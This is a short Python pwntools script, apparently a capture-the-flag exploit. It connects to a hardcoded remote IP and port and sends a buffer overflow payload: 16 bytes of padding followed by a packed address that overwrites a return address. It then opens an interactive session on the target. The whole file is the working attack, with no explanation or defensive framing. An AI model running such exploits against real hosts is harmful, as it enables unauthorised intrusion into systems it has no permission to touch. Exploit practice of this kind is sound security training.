#!/usr/bin/env python3

from pwn import remote, p64

io = remote("139.177.185.41", 10533)

payload = b"A" * 16
payload += p64(0x000106a6)

io.sendline(payload)
io.interactive()
